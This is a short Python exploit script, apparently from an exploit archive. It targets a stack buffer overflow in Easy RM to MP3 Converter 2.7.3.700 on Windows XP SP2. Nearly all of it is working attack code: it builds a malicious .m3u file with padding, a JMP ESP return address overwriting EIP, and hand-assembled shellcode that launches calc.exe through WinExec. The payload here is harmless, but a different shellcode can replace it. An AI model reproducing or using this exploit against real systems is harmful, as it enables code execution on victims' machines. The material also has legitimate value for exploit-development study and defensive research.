# -*- coding: utf-8 -*-
"""
#[+] Author: Hykatza
#[+] Title: Easy RM to MP3 Converter 2.7.3.700 (.m3u) File WinXP Sp2 Buffer Overflow Exploit
#[+] Type: Exploit
#[+] Download Vulnerable App: https://www.exploit-db.com/apps/707414955696c57b71c7f160c720bed5-EasyRMtoMP3Converter.exe
#[+] Shellcode: calc.exe
#[+] Tested on: WinXp 32bit SP2
#[+] Friendly sites: untalhykatza.blogspot.mx
#[+] Twitter: @hykatza
=====================================================

         .
         \'~~~-,
          \    '-,_
           \ /\    `~'~''\          M Ãˆ X I C O
           _\ \\          \/~\
           \__ \\             \
              \ \\.             \
               \ \ \             `~~
                '\\ \.             /
                 L \  \            |
                  \_\  \           |             _.----,
                        |  hykatza  \           !     /
                       '._  00101    \_      __/    _/
                          \_           ''--''    __/
                            \.__                |
                                ''.__  __.._   __\
                                     ''     './  `
=====================================================
"""
fileName='EasyRMToMp3_Exploit_JMPESP.m3u';
fileC=open(fileName,'w');
junk='\x41'*13500;
junk+='\x42'*12518;
eip='\xaf\x83\xca\x58';#58ca83af -> JMP ESP
preshellcode='\x90'*4;
shellcode=(
    "\x90"                      #nops
    "\x33\xd2"                  #xor edx,edx
    "\x52"                      #push edx
    "\x68\x2e\x65\x78\x65"	#push ".exe"
    "\x68\x63\x61\x6c\x63"	#push "calc"
    "\x89\xe0"			#mov eax,esp
    "\x6a\x01"			#push 1
    "\x50"			#push eax
    "\xbb\x4d\x11\x86\x7c"	#mov ebx,kernel32.WinExec -> mov ebx,0x7c86114d
    "\xff\xd3"		        #call ebx
    "\x6a\x01"                  #push 1
    "\xbb\xa2\xca\x81\x7c"      #mov ebx,kernel32.ExitProcess-> mov ebx,0x7c81caa2
    "\xff\xd3"                  #call ebx
);
shellcode=preshellcode+shellcode;
contentExploit=junk+eip+shellcode;
fileC.write(contentExploit);
fileC.close();
